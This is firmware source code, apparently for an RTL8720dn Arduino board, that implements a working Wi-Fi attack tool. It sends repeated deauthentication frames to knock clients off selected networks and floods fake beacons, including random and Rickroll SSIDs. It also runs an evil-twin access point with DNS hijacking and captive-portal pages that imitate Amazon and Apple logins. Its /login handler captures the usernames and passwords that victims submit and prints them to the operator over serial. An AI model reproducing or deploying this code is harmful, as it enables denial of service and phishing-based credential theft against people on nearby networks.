#include "Arduino.h"
#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_drv.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

#include "dns.h"
#include "portals/default.h"
#include "portals/amazon.h"
#include "portals/apple.h"

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

TaskHandle_t scanInProcess = NULL;
TaskHandle_t wifiRunning = NULL;

#define MAX_TASKS 5

bool randomBeaconActive = false;
bool rickrollBeaconActive = false;
TaskHandle_t beaconFloodTask = NULL;

typedef struct {
  TaskHandle_t handle;
  int* networkIndex;
  int reason;
} DeauthTask;

DeauthTask deauthTasks[MAX_TASKS];

unsigned short int taskCount = 0;


const byte numBytes = 32;
byte receivedBytes[numBytes];
byte numReceived = 0;

char dataArray[numBytes];
boolean newData = false;


typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
  int security;
} WiFiScanResult;


char *ssid = "RTL8720dn";
char *pass = "password123";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<int> deauth_wifis;
WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

#define FRAMES_PER_DEAUTH 5

String start = String(char(0x02));

String sep = String(char(0x1D));

String end = String(char(0x03));

const char* rickroll_ssids[] = {
    "01 Never gonna give you up",
    "02 Never gonna let you down", 
    "03 Never gonna run around",
    "04 and desert you",
    "05 Never gonna make you cry",
    "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",
    "08 and hurt you"
};

// Channel arrays for beacon flooding
int beacon_channels_2g[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
int beacon_channels_5g[] = {36, 40, 44, 48, 149, 153, 157, 161};


TaskHandle_t customBeaconTask = NULL;
String customBeaconSSID = "";
bool customBeaconActive = false;


String printEncryptionTypeEx(uint32_t thisType) {
  /*  Arduino wifi api use encryption type to mapping to security type.
   *  This function demonstrate how to get more richful information of security type.
   */
  switch (thisType) {
    case SECURITY_OPEN:
      return "Open";
      break;
    case SECURITY_WEP_PSK:
      return "WEP";
      break;
    case SECURITY_WPA_TKIP_PSK:
      return "WPA TKIP";
      break;
    case SECURITY_WPA_AES_PSK:
      return "WPA AES";
      break;
    case SECURITY_WPA2_AES_PSK:
      return "WPA2 AES";
      break;
    case SECURITY_WPA2_TKIP_PSK:
      return "WPA2 TKIP";
      break;
    case SECURITY_WPA2_MIXED_PSK:
      return "WPA2 Mixed";
      break;
    case SECURITY_WPA_WPA2_MIXED:
      return "WPA/WPA2 AES";
      break;
    case 6291462:
      return "Auto";
      break;
    case 8388612:
      return "WPA3";
      break;
  }

  return "Unknown";
}

String generateRandomString(int len) {
    String randstr = "";
    const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    
    for (int i = 0; i < len; i++) {
        int index = random(0, strlen(setchar));
        randstr += setchar[index];
    }
    return randstr;
}


rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    result.security = record->security;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

void scanNetworks(void *pvParameters) {
  int time_ms = 5000; // default

  if (pvParameters) {
      time_ms = *((int*)pvParameters);
      delete (int*)pvParameters; // free memory after use
  }

  DEBUG_SER_PRINT("Scanning WiFi networks (");
  DEBUG_SER_PRINT(time_ms / 1000);
  DEBUG_SER_PRINTLN("s)...");
  //prevTime = currentTime;
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, HIGH);
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    vTaskDelay(time_ms / portTICK_PERIOD_MS);
    DEBUG_SER_PRINT(" done!\n");
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_R, HIGH);
    //return 0;
    
    
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_R, HIGH);
    //return 1;
  }
  scanInProcess = NULL;
  vTaskDelete(NULL);
  
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;

    // Find the start of the body
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params; // Return an empty vector if no body found
    }
    body_start += 4;

    // Extract the POST data
    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    // Loop through the key-value pairs
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.push_back({key, value}); // Add the key-value pair to the vector
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    // Handle the last key-value pair
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params.push_back({key, value});
    }

    return post_params;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}


enum WebPortalType {
    DefaultPortal,
    WaitPortal,
    AmazonPortal,
    ApplePortal
    // Add more as needed
};

WebPortalType currentPortal = DefaultPortal;

void handleRoot(WiFiClient &client, WebPortalType portalType = DefaultPortal) {
    String response = makeResponse(200, "text/html");
    if (portalType == WaitPortal) {
        response += PORTAL_WAIT;
    } else if (portalType == DefaultPortal) {
        response += PORTAL_DEFAULT_TOP;
        for (uint32_t i = 0; i < scan_results.size(); i++) {
            response += "<tr>";
            response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
            response += "<td>" + String(i) + "</td>";
            response += "<td>" + scan_results[i].ssid + "</td>";
            response += "<td>" + scan_results[i].bssid_str + "</td>";
            response += "<td>" + String(scan_results[i].channel) + "</td>";
            response += "<td>" + String(scan_results[i].rssi) + "</td>";
            response += "<td>" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
            response += "</tr>";
        }
        response += PORTAL_DEFAULT_BOTTOM;
    } else if (portalType == AmazonPortal) {
      response += PORTAL_AMAZON;
    } else if (portalType == ApplePortal) {
      response += PORTAL_APPLE;
    }
    client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}


int cmd_scan(){
  int time;
  // Copy the number part to a buffer and null-terminate it
  char numbuf[8] = {0}; // Enough for 7 digits + null
  memcpy(numbuf, &receivedBytes[1], numReceived - 1);
  numbuf[numReceived - 1] = '\0';
  time = atoi(numbuf);

  if (time == 0){
    time = 5000;
  }

  //DEBUG_SER_PRINTLN(time);

  if (scanInProcess == NULL) {
    int* scan_time = new int(time);
    xTaskCreate(scanNetworks, "networkScan", 1024, (void*)scan_time, 1, &scanInProcess);
  } else {
    DEBUG_SER_PRINTLN("Scan already running!");
  }
  return 0;
}


void beaconFloodTask_func(void *pvParameters) {
    int mode = *((int*)pvParameters);
    delete (int*)pvParameters;
    
    uint8_t fake_mac[6];
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    int rickroll_index = 0;
    
    // Store MAC addresses for Rick roll SSIDs to keep them consistent
    uint8_t rickroll_macs[8][6]; // 8 Rick roll SSIDs, 6 bytes each for MAC
    bool rickroll_macs_initialized = false;
    
    // Initialize Rick roll MAC addresses once
    if (mode == 2 && !rickroll_macs_initialized) {
        for (int i = 0; i < 8; i++) {
            // Generate consistent MAC for each Rick roll SSID based on SSID content
            String ssid = rickroll_ssids[i];
            uint32_t hash = stringHash(ssid);
            
            for (int j = 0; j < 6; j++) {
                rickroll_macs[i][j] = (hash + j) & 0xFF;
                hash = hash >> 8;
            }
            rickroll_macs[i][0] &= 0xFE; // Ensure unicast address
            rickroll_macs[i][0] |= 0x02; // Set locally administered bit
        }
        rickroll_macs_initialized = true;
    }
    
    while (true) {
        String ssid;
        int channel;
        
        if (mode == 1) { // Random beacon mode
            // Generate random MAC for each random beacon
            for (int i = 0; i < 6; i++) {
                fake_mac[i] = random(0x00, 0xFF);
            }
            fake_mac[0] &= 0xFE; // Ensure unicast address
            fake_mac[0] |= 0x02; // Set locally administered bit
            
            // Generate random SSID
            ssid = generateRandomString(random(8, 32));
            
            // Random channel selection (mix 2.4GHz and 5GHz)
            if (random(0, 2) == 0) {
                channel = beacon_channels_2g[random(0, 11)];
            } else {
                channel = beacon_channels_5g[random(0, 8)];
            }
            
        } else if (mode == 2) { // Rick roll mode
            // Use the pre-generated MAC for this specific Rick roll SSID
            memcpy(fake_mac, rickroll_macs[rickroll_index], 6);
            
            ssid = rickroll_ssids[rickroll_index];
            rickroll_index = (rickroll_index + 1) % 8;
            
            // Cycle through 2.4GHz channels for rick roll
            channel = beacon_channels_2g[random(0, 11)];
        }
        
        // Set channel and transmit beacon
        wext_set_channel(WLAN0_NAME, channel);
        wifi_tx_beacon_frame(fake_mac, broadcast_mac, ssid.c_str());
        
        // LED indication
        digitalWrite(LED_G, !digitalRead(LED_G));
        
        // Delay between beacons (adjust as needed)
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

uint32_t stringHash(const String& str) {
  uint32_t hash = 5381;
  for (unsigned int i = 0; i < str.length(); i++) {
      hash = ((hash << 5) + hash) + str.charAt(i);
  }
  return hash;
}

void customBeaconTask_func(void *pvParameters) {
    String* ssid_ptr = (String*)pvParameters;
    String ssid = *ssid_ptr;
    delete ssid_ptr; // Clean up allocated memory
    
    uint8_t fake_mac[6];
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    DEBUG_SER_PRINT("Broadcasting custom beacon with random MACs: ");
    DEBUG_SER_PRINTLN(ssid);
    
    while (true) {
        // Generate random MAC address for each beacon
        for (int i = 0; i < 6; i++) {
            fake_mac[i] = random(0x00, 0xFF);
        }
        fake_mac[0] &= 0xFE; // Ensure unicast address
        fake_mac[0] |= 0x02; // Set locally administered bit
        
        // Random channel selection (mix 2.4GHz and 5GHz like random beacon)
        int channel;
        if (random(0, 2) == 0) {
            channel = beacon_channels_2g[random(0, 11)];
        } else {
            channel = beacon_channels_5g[random(0, 8)];
        }
        
        // Set channel and transmit beacon
        wext_set_channel(WLAN0_NAME, channel);
        //wifi_tx_beacon_frame(fake_mac, broadcast_mac, ssid.c_str());
        wifi_tx_encrypted_beacon_frame(fake_mac, broadcast_mac, ssid.c_str(), channel);
        
        // LED indication
        digitalWrite(LED_B, !digitalRead(LED_B));
        
        // Delay between beacons (same as random beacon)
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

int cmd_beacon() {
    if (dataArray[0] == 's') {
        // Stop beacon flooding
        DEBUG_SER_PRINTLN("Stopping beacon flood...");
        if (beaconFloodTask != NULL) {
            vTaskDelete(beaconFloodTask);
            beaconFloodTask = NULL;
            randomBeaconActive = false;
            rickrollBeaconActive = false;
            digitalWrite(LED_G, LOW);
        }
    } else if (dataArray[0] == 'r') {
        // Random beacon flooding
        DEBUG_SER_PRINTLN("Starting random beacon flood...");
        if (beaconFloodTask == NULL) {
            int* mode = new int(1);
            xTaskCreate(beaconFloodTask_func, "beaconFlood", 2048, (void*)mode, 1, &beaconFloodTask);
            randomBeaconActive = true;
        }
    } else if (dataArray[0] == 'k') {
        // Rick roll beacon flooding  
        DEBUG_SER_PRINTLN("Starting rickroll beacon flood...");
        if (beaconFloodTask == NULL) {
            int* mode = new int(2);
            xTaskCreate(beaconFloodTask_func, "beaconFlood", 2048, (void*)mode, 1, &beaconFloodTask);
            rickrollBeaconActive = true;
        }
    } else if (dataArray[0] == 'c') {
        // Custom SSID beacon
        // Extract custom SSID from dataArray (after 'c')
        String custom_ssid = "";
        for (int i = 1; i < numReceived - 1; i++) {
            custom_ssid += (char)dataArray[i];
        }
        
        if (custom_ssid.length() > 0 && custom_ssid.length() <= 32) {
            DEBUG_SER_PRINT("Starting custom beacon: ");
            DEBUG_SER_PRINTLN(custom_ssid);
            
            // Stop any existing beacon tasks first
            if (beaconFloodTask != NULL) {
                vTaskDelete(beaconFloodTask);
                beaconFloodTask = NULL;
                randomBeaconActive = false;
                rickrollBeaconActive = false;
            }
            if (customBeaconTask != NULL) {
                vTaskDelete(customBeaconTask);
                customBeaconTask = NULL;
            }
            
            // Start custom beacon task
            String* ssid_ptr = new String(custom_ssid);
            xTaskCreate(customBeaconTask_func, "customBeacon", 2048, (void*)ssid_ptr, 1, &customBeaconTask);
            customBeaconActive = true;
            customBeaconSSID = custom_ssid;
            
      } else {
          DEBUG_SER_PRINTLN("Invalid SSID length (must be 1-32 characters)");
      }
    }
    return 0;
}










/*
void printFreeHeap() {
    size_t freeHeap = xPortGetFreeHeapSize();
    Serial.print("Free heap: ");
    Serial.print(freeHeap);
    Serial.println(" bytes");
}
*/

int cmd_wifi(bool state){
  //DEBUG_SER_PRINTLN((int)dataArray[0]);
  switch (state){
    case true:
      DEBUG_SER_PRINTLN("Turning on wifi...");
      if (wifiRunning == NULL){

        start_DNS_Server(); // This function is from dns.cpp

        WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
        DEBUG_SER_PRINTLN("Wifi on!");

        xTaskCreate(clientHandler, "clientConnected", 1024, NULL, 1, &wifiRunning);

        
        break;
      } else{
        DEBUG_SER_PRINTLN("WiFi server is already on.");
        break;
      }

    case false:
      DEBUG_SER_PRINTLN("Turning off wifi server...");
      if (wifiRunning != NULL) {
        
        vTaskDelete(wifiRunning);
        wifiRunning = NULL;

        WiFiClient client = server.available();
        while(client.connected()){
          DEBUG_SER_PRINT(client);
          client.flush();
          client.stop();
          client = server.available();
        }

        unbind_dns();


        
        wifi_off();

        vTaskDelay(2000 / portTICK_PERIOD_MS);

        digitalWrite(LED_G, LOW);
        
        WiFiDrv::wifiDriverInit();

        wifi_on(RTW_MODE_AP); //Memory leak somewhere here

        vTaskDelay(500 / portTICK_PERIOD_MS);
        WiFi.status();
        break;
      } else{
        DEBUG_SER_PRINTLN("WiFi server is already off.");
        break;
      }
  }
  
  //DEBUG_SER_PRINTLN("Invalid command.");
  return 0;
}

int cmd_get(){
  DEBUG_SER_PRINTLN("Getting...");

  #ifdef DEBUG
  for (uint32_t i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINTLN("");
    DEBUG_SER_PRINT("\t" + String(i));
    DEBUG_SER_PRINT("\t" + scan_results[i].ssid);
    DEBUG_SER_PRINT("\t\t" + scan_results[i].bssid_str);
    DEBUG_SER_PRINT("\t" + String(scan_results[i].channel));
    DEBUG_SER_PRINT("\t" + String(scan_results[i].rssi));
    DEBUG_SER_PRINT("\t" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz"));
    DEBUG_SER_PRINT("\t" + printEncryptionTypeEx(scan_results[i].security));
  }
  #endif

  DEBUG_SER_PRINTLN("");
  Serial.print(start + String('i') + scan_results.size() + end);
  for (uint32_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].ssid == ""){
      Serial.print(start + String('n') + String(i) + sep + "Hidden" + sep + scan_results[i].bssid_str + sep + ((scan_results[i].channel >= 36) ? "1" : "0") + end);
    } else{
      Serial.print(start + String('n') + String(i) + sep + scan_results[i].ssid + sep + scan_results[i].bssid_str + sep + ((scan_results[i].channel >= 36) ? "1" : "0") + end);
    }
  }
  DEBUG_SER_PRINTLN("");
  DEBUG_SER_PRINTLN("Done!");
  return 0;
}


bool isNetworkIndexInUse(int index) {
  for (int i = 0; i < taskCount; i++) {
    if (deauthTasks[i].networkIndex != nullptr && *deauthTasks[i].networkIndex == index) {
      return true;  // Duplicate found
    }
  }
  return false;  // Safe to use
}

int cmd_portal() {
    if (wifiRunning == NULL) {
        DEBUG_SER_PRINTLN("WiFi server is not running. Start WiFi first.");
        return 1;
    }
    
    char portal_type = dataArray[0];
    WebPortalType newPortal;
    
    switch (portal_type) {
        case '1':
            newPortal = DefaultPortal;
            DEBUG_SER_PRINTLN("Switching to Default portal");
            break;
        case '2':
            newPortal = AmazonPortal;
            DEBUG_SER_PRINTLN("Switching to Amazon portal");
            break;
        case '3':
            newPortal = ApplePortal;
            DEBUG_SER_PRINTLN("Switching to Apple portal");
            break;
        default:
            DEBUG_SER_PRINTLN("Invalid portal type. Use 1-4.");
            return 1;
    }
    
    // Change the current portal
    currentPortal = newPortal;
    DEBUG_SER_PRINTLN("Portal changed successfully!");
    
    return 0;
}


void createNewDeauthTask(int index, int reason) {
  if (taskCount >= MAX_TASKS) return;
  
  if (isNetworkIndexInUse(index)) {
    DEBUG_SER_PRINTLN("Deauth for this network is already running.");
    return;
  }

  DeauthTask* taskParams = new DeauthTask();
  taskParams->networkIndex = new int(index);
  taskParams->reason = reason;

  //int *param = new int(index);
  xTaskCreate(deauthNetwork, "deauthRun", 2048, (void*)taskParams, 1, &deauthTasks[taskCount].handle); //param
  deauthTasks[taskCount].networkIndex = taskParams->networkIndex; //param
  deauthTasks[taskCount].reason = taskParams->reason;
  taskCount++;
}

void deleteAllDeauthTasks() {
  digitalWrite(LED_B, LOW);
  for (int i = 0; i < taskCount; i++) {
    if (deauthTasks[i].handle != NULL) {
      vTaskDelete(deauthTasks[i].handle);
      deauthTasks[i].handle = NULL;
    }

    if (deauthTasks[i].networkIndex != nullptr) {
      delete deauthTasks[i].networkIndex;
      deauthTasks[i].networkIndex = nullptr;
      delete &deauthTasks[i];
    }
  }
  taskCount = 0;
}


int cmd_deauth() {
    if(dataArray[0] == 's'){
        DEBUG_SER_PRINTLN("Stopping...");
        deleteAllDeauthTasks();
    } else {
        // Support up to two digits: <d0>, <d9>, <d10>, <d99>
        int idx = 0;
        int idy = 0; // New variable for YY

        // Parse idx (up to two digits)
        if(dataArray[1] >= '0' && dataArray[1] <= '9') {
            idx = (dataArray[0] - '0') * 10 + (dataArray[1] - '0');
        } else if(dataArray[0] >= '0' && dataArray[0] <= '9') {
            idx = dataArray[0] - '0';
        }

        // Parse idy (up to two digits after dash at index 2)
        if(dataArray[2] == '-') {
            if(dataArray[4] >= '0' && dataArray[4] <= '9') {
                idy = (dataArray[3] - '0') * 10 + (dataArray[4] - '0');
            } else if(dataArray[3] >= '0' && dataArray[3] <= '9') {
                idy = dataArray[3] - '0';
            }
        }

        DEBUG_SER_PRINT("Deauthing... ");
        DEBUG_SER_PRINT(idx);
        DEBUG_SER_PRINT(" idy: ");
        DEBUG_SER_PRINT(idy);
        DEBUG_SER_PRINTLN();
        for (uint32_t i = 0; i < scan_results.size(); i++) {
            if((unsigned)idx == i){
                DEBUG_SER_PRINTLN("Success");
                DEBUG_SER_PRINTLN(scan_results[i].ssid);
                createNewDeauthTask(i, idy);
            }
        }
    }
    return 0;
}

void read_line(){
  static boolean recvInProgress = false;
  static byte ndx = 0;
  byte startMarker = 0x02;
  byte endMarker = 0x03;
  byte rb;
  

  while (Serial.available() > 0 && newData == false) {
    rb = Serial.read();

    if (recvInProgress == true) {
        if (rb != endMarker) {
            receivedBytes[ndx] = rb;
            ndx++;
            if (ndx >= numBytes) {
                ndx = numBytes - 1;
            }
        }
        else {
            receivedBytes[ndx] = '\0'; // terminate the string
            recvInProgress = false;
            numReceived = ndx;  // save the number for use when printing
            ndx = 0;
            newData = true;
        }
    }

    else if (rb == startMarker) {
        recvInProgress = true;
    }
  }

  if (newData == true) {

    DEBUG_SER_PRINT("This just in (HEX values)... ");

    

    for (byte n = 1; n < numReceived; n++) {
      dataArray[n-1] = receivedBytes[n];

      DEBUG_SER_PRINT((char)receivedBytes[n]);
      Serial.print(' ');
    }

    DEBUG_SER_PRINTLN();

    char data = receivedBytes[0];
    switch (data){
      case 's':
        DEBUG_SER_PRINTLN("Scan");
        cmd_scan();
        break;
      case 'g':
        DEBUG_SER_PRINTLN("Get");
        cmd_get();
        break;
      case 'd':
        DEBUG_SER_PRINTLN("Deauth");
        cmd_deauth();
        break;
      case 'w':
      {
        DEBUG_SER_PRINTLN("Wifi");

        char data1 = receivedBytes[1];

        DEBUG_SER_PRINTLN(data1);
        switch (data1){
          case '1':
            currentPortal = DefaultPortal;
            cmd_wifi(1); 
            break;
          case '2':
            currentPortal = AmazonPortal;
            cmd_wifi(1);
            break;
          case '3':
            currentPortal = ApplePortal;
            cmd_wifi(1);
            break;
          case '0':
            cmd_wifi(0);
            break;
        }
        break;
      }
      case 'b':
        DEBUG_SER_PRINTLN("Beacon");
        cmd_beacon();
        break;
      case 'p':
        DEBUG_SER_PRINTLN("Portal Change");
        cmd_portal();
        break;
    }

    
    newData = false;
  }
}




void mainProgram(void *pvParameters){ 
  (void)pvParameters;
  while (true){
    read_line();
  }
}



void clientHandler(void *pvParameters){
    (void)pvParameters;
    while(true){
        WiFiClient client = server.available();
        if (client.connected()) {
            digitalWrite(LED_G, HIGH);
            String request = "";

            unsigned long timeout = millis();
            while (client.connected() && millis() - timeout < 2000) {
                while (client.available()) {
                    char c = client.read();
                    request += c;
                    timeout = millis(); // reset timeout on new data
                }
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }

            if (request.length() > 0) {
                DEBUG_SER_PRINT(request);
                String path = parseRequest(request);
                DEBUG_SER_PRINT("\nRequested path: " + path + "\n");

                if (
                    path == "/" ||
                    path.startsWith("/generate_204") ||
                    path.startsWith("/hotspot-detect.html") ||
                    path.startsWith("/connecttest.txt") ||
                    path.startsWith("/gen_204") ||
                    path == "/deauth"
                ) {
                    if (path == "/deauth") {
                        auto post_data = parsePost(request);
                        for (auto &param : post_data) {
                            if (param.first == "network") {
                                createNewDeauthTask(param.second.toInt(), 2);
                            } else if (param.first == "reason") {
                                deauth_reason = param.second.toInt();
                            }
                        }
                    }
                    handleRoot(client, currentPortal); // Always serve the portal page
                } else if (path == "/rescan") {
                    // Serve the "please wait" page from web_root.h
                    handleRoot(client, WaitPortal);
                    client.stop();

                    // Start the scan (portal will be unavailable during scan)
                    vTaskDelay(3000 / portTICK_PERIOD_MS);
                    if (scanInProcess == NULL) {
                        xTaskCreate(scanNetworks, "networkScan", 1024, NULL, 1, &scanInProcess);
                    }
                    // Don't serve handleRoot here, as the scan will block AP
                } else if (path.startsWith("/login")) {
                    int qmark = path.indexOf('?');
                    if (qmark != -1) {
                        String query = path.substring(qmark + 1); // username=...&password=...
                        int userIdx = query.indexOf("username=");
                        int passIdx = query.indexOf("password=");
                        String username, password;
                        if (userIdx != -1 && passIdx != -1) {
                            int userEnd = query.indexOf('&', userIdx);
                            if (userEnd == -1) userEnd = query.length();
                            username = query.substring(userIdx + 9, userEnd);

                            int passEnd = query.indexOf('&', passIdx);
                            if (passEnd == -1) passEnd = query.length();
                            password = query.substring(passIdx + 9, passEnd);

                            DEBUG_SER_PRINT("Username: ");
                            DEBUG_SER_PRINTLN(username);
                            DEBUG_SER_PRINT("Password: ");
                            DEBUG_SER_PRINTLN(password);

                            Serial.print(start + "c" + sep);
                            Serial.print(username);
                            Serial.print(sep);
                            Serial.print(password);
                            Serial.println(end);
                        }
                    }
                    String response = makeResponse(200, "text/plain");
                    response += "Login received";
                    client.write(response.c_str());
                } else {
                    handle404(client);
                }
            } else {
                DEBUG_SER_PRINTLN("⚠️ No request received.");
            }

            client.stop();
            digitalWrite(LED_G, LOW);
        }
        //vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}










void deauthNetwork(void *pvParameters){

  DeauthTask* params = (DeauthTask*)pvParameters;

  int index = *params->networkIndex;
  int reason = params->reason;

  //DEBUG_SER_PRINTLN(reason);

  while(true){
    //DEBUG_SER_PRINTLN("Deauth task started");
    memcpy(deauth_bssid, scan_results[index].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[index].channel);

    digitalWrite(LED_B, HIGH);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
      vTaskDelay(5 / portTICK_PERIOD_MS);
      //DEBUG_SER_PRINTLN("sent");
    }
    digitalWrite(LED_B, LOW);
    vTaskDelay(50 / portTICK_PERIOD_MS);
  }
  
}






void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  Serial.begin(115200);
  //Serial1.begin(115200);
  WiFi.status();

  if (scanInProcess == NULL) {
    xTaskCreate(scanNetworks, "networkScan", 1024, NULL, 1, &scanInProcess);
  } else {
    DEBUG_SER_PRINTLN("Task already running!");
  }

  //WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  /**
  if (scanNetworks()) {
    delay(1000);
  }
  **/
#ifdef DEBUG
  //Serial.begin(115200);
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();

  xTaskCreate(mainProgram, "main", 1024, NULL, 1, NULL);

  //xTaskCreate(clientHandler, "clientConnected", 1024, NULL, 1, &wifiRunning);


  
  digitalWrite(LED_R, LOW);
}

void loop() {

}
